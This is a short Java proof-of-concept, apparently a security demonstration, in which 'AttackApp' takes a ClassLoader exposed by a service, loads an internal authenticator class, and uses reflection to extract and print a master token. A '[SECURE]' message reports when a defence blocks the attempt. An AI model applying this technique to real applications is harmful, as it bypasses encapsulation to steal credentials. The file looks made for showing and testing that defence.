package com.client;

import com.service.ClassLoaderService;
import java.lang.reflect.Method;

public class AttackApp {
    public static void main(String[] args) {
        System.out.println("--- Shadow Loader Attack ---");
        ClassLoaderService service = new ClassLoaderService();

        // 1. Legitimate use of the service
        service.logActivity("AttackApp started");

        // 2. The Exploit: Reach into internal packages using the exposed ClassLoader
        try {
            System.out.println("\n[ATTACK] Attempting to hijack the ClassLoader...");
            ClassLoader hijackedLoader = service.getLoader();

            if (hijackedLoader != null) {
                System.out.println("[ATTACK] Hijacked ClassLoader: " + hijackedLoader);

                // Use the hijacked loader to load the internal class
                String internalClassName = "com.service.internal.SecureAuthenticator";
                Class<?> internalClass = Class.forName(internalClassName, true, hijackedLoader);

                // Invoke the sensitive method via reflection
                Method getSecret = internalClass.getMethod("getMasterToken");
                String secret = (String) getSecret.invoke(null);

                System.out.println("[ATTACK] SUCCESS! Leaked Internal Token: " + secret);
            }
        } catch (Exception e) {
            System.out.println("\n[SECURE] Attack failed: " + e.getMessage());
        }
    }
}
